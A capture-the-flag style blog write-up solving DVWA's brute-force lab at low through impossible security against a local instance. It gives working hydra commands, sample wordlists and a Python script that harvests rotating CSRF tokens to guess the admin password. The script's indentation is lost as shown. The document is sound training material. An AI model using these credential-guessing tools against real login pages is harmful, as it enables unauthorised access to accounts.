---
title: DVWA - Brute Force
date: 2023-12-06
categories: [DVWA, Brute Force]
tags: [dvwa, brute-force, hydra, burp-suite, python, bs4, beautifulsoup, csrf, 2to3]
img_path: /assets/dvwa/brute_force
published: true
---

## Information

- [How to install dvwa on Kali](https://www.kali.org/tools/dvwa/).
- [Official GitHub repository](https://github.com/digininja/DVWA).

The DVWA server contains detailed instructions about everything, and as it is mentioned there:

__Damn Vulnerable Web Application (DVWA) is a PHP/MySQL web application that is damn vulnerable. Its main goal is to be an aid for security professionals to test their skills and tools in a legal environment, help web developers better understand the processes of securing web applications and to aid both students & teachers to learn about web application security in a controlled class room environment.__

__The aim of DVWA is to practice some of the most common web vulnerabilities, with various levels of difficultly, with a simple straightforward interface.__

> If you have any problem though, feel free to reach out!

![](dvwa_home.png)

The DVWA server has four different security levels which can be set as seen below:

![](security_levels.png)

## Security: Low

1. Intercept packet with Burp Suite:

	![](burp_proxy.png)

Things to note down:
- `GET` request
- Parameters: `username`, `password`, `Login`
- `Cookie: PHPSESSID=ud36qu65oddvmncfg54n515nhn; security=low`

2. Check for error messages when attempting a random login (via Burp Suite or browser):

	![](error_message.jpg)

	![](error_message.png)


3. Create a small username and password lists for efficiency:

	```shell
	cat usernames.txt
	root
	peter
	kevin
	harris
	maria
	andrew
	mike
	sridevi
	pavithra
	admin

	cat passwords.txt
	1234
	123456
	pass
	password123
	qwerty
	qwerty123456
	12345
	1234567890
	qwertyasdfg
	password
	```

3. Build a `hydra` command using the above info:

	```shell
	hydra -L usernames.txt -P passwords.txt 127.0.0.1 -s 42001 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=ud36qu65oddvmncfg54n515nhn; security=low:F=Username and/or password incorrect." -t 30
	```

	![](low_hydra.png)

	![](low_success.png)

## Security: Medium

1. Almost identical `hydra` command as before, just change `security=low` to `security=medium`:

	```shell
	hydra -L usernames.txt -P passwords.txt 127.0.0.1 -s 42001 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=ud36qu65oddvmncfg54n515nhn; security=medium:F=Username and/or password incorrect." -t 30
	```

	![](medium_hydra.png)

	> Why the false positive?

	> The command took a bit longer to complete, as a `sleep(2)` function was added to the source code.

## Security: High

1. Same concept as before, this time changing `security=medium` to `security=high`:

	```shell
	hydra -L usernames.txt -P passwords.txt 127.0.0.1 -s 42001 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=ud36qu65oddvmncfg54n515nhn; security=high:F=Username and/or password incorrect." -t 30
	```

	![](high_hydra.png)

	> What's the difference between `Medium` and `High`? The source code adds an Anti-CSRF token, but seems not to work here.

## Security: Impossible

Resources to read:
- OWASP: [Cross Site Request Forgery (CSRF)](https://owasp.org/www-community/attacks/csrf)

> The CSRF token is used to add credibility to the origin of the request being received by the server, this token is a impossible to guess random number generated by the server and is sent along with our GET request.

1. Using the `hydra` command won't work this time (`100 valid passwords found` --> all combinations):

	```shell
	hydra -L usernames.txt -P passwords.txt 127.0.0.1 -s 42001 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=ud36qu65oddvmncfg54n515nhn; security=impossible:F=Username and/or password incorrect." -t
	30
	```

	![](impossible_hydra.png)

2. Due to the added CSRF token, `hydra` can't brute force the credentials. It does not have the ability to collect the CSRF token while making the request:

	![](csrf_token.png)

	![](hidden_to_text.jpg)

	![](token_appearance.png)

	The CSRF token (`user_token`) changes on every attempted login:

	![](impossible_burp_proxy_user_token.png)

	![](impossible_burp_proxy_user_token1.png)

3. Create a custom brute-forcing script:

	> Original code taken from [Danny Beton](https://medium.com/@dannybeton/dvwa-brute-force-tutorial-high-security-456e6ed3ae39).

	Changes needed from the [Security Tutorials article](https://securitytutorials.co.uk/brute-forcing-web-logins-with-dvwa/):
	1. `sudo pip3 install bs4, 2to3`
	2. `sudo apt install 2to3`
	3. Conversion of the script from Python2 to Python3: `2to3 -w csrf_script.py` 
	4. Modify bs4 import: `from BeautifulSoup import BeautifulSoup as Soup` to `from bs4 import BeautifulSoup as Soup`.

	> Documentation: [bs4](https://pypi.org/project/beautifulsoup4/), [2to3](https://docs.python.org/3/library/2to3.html).  


	```python
	# modified code
	from sys import argv
	import requests
	from bs4 import BeautifulSoup as Soup

	# give our arguments more semantic friendly names
	script, filename, success_message = argv
	txt = open(filename)

	# set up our target, cookie and session
	url = 'http://127.0.0.1:42001/vulnerabilities/brute/index.php'
	cookie = {'security': 'high', 'PHPSESSID':'ud36qu65oddvmncfg54n515nhn'}
	s = requests.Session()
	target_page = s.get(url, cookies=cookie)

	''' 
	checkSuccess
	@param: html (String)

	Searches the response HTML for our specified success message
	'''
	def checkSuccess(html):
	# get our soup ready for searching
	soup = Soup(html, features="lxml")
	# check for our success message in the soup
	search = soup.findAll(text=success_message)
	
	if not search:
	success = False

	else:
	success = True

	# return the brute force result
	return success

	# Get the intial CSRF token from the target site
	page_source = target_page.text
	soup = Soup(page_source, features="lxml");
	csrf_token = soup.findAll(attrs={"name": "user_token"})[0].get('value')

	# Display before attack
	print('DVWA URL' + url)
	print('CSRF Token='+ csrf_token)

	# Loop through our provided password file
	with open(filename) as f:
	print('Running brute force attack...')
	for password in f:

	# strip whitespace
	password = password.strip()
	
	# setup the payload
	payload = {'username': 'admin', 'password': password, 'Login': 'Login', 'user_token': csrf_token}
	r = s.get(url, cookies=cookie, params=payload)
	success = checkSuccess(r.text)

	if not success:
	# if it failed the CSRF token will be changed. Get the new one
	soup = Soup(r.text, features="lxml")
	csrf_token = soup.findAll(attrs={"name": "user_token"})[0].get('value')
	else:
	# Success! Show the result
	print('Password is: ' + password)
	break

	# We failed, bummer. 
	if not success:
	print('Brute force failed. No matches found.')
	```

	```shell
	# running python script
	python3 csrf_script.py passwords.txt "Welcome to the password protected area admin"
	DVWA URLhttp://127.0.0.1:42001/vulnerabilities/brute/index.php
	CSRF Token=09377057fe6a3b73fe3eb82c6ecce061
	Running brute force attack...
	Password is: password
	```




